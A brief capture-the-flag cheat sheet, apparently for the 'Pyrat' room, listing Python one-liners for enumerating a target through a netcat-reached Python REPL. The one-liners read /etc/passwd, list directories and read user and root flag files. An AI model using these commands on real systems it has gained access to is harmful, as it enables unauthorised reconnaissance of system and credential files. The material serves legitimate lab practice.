
### 🐍 Python One-Liners for Navigation in Netcat

#### 📂 List directories

```python
import os; print(os.listdir("/"))
```

List contents of `/home`:

```python
import os; print(os.listdir("/home"))
```

#### 📖 Read a file

```python
print(open("/etc/passwd").read())
```

Or:

```python
print(open("/home/pyrat/user.txt").read())
```

#### 📌 Get current working directory

```python
import os; print(os.getcwd())
```

#### 🔁 Change directory

```python
import os; os.chdir("/home/pyrat"); print(os.listdir())
```

#### 👤 Get username

```python
import os; print(os.getlogin())
```

#### 🆔 Get UID/GID

```python
import os; print(os.getuid(), os.getgid())
```

---

### 🔑 Quick Workflow in Pyrat

From your nc Python REPL:

1. See where you are:

   ```python
   import os; print(os.getcwd())
   ```
2. Check `/home`:

   ```python
   import os; print(os.listdir("/home"))
   ```
3. Read the user flag:

   ```python
   print(open("/home/pyrat/user.txt").read())
   ```
4. Look into `/root` for the root flag:

   ```python
   print(open("/root/root.txt").read())
   ```
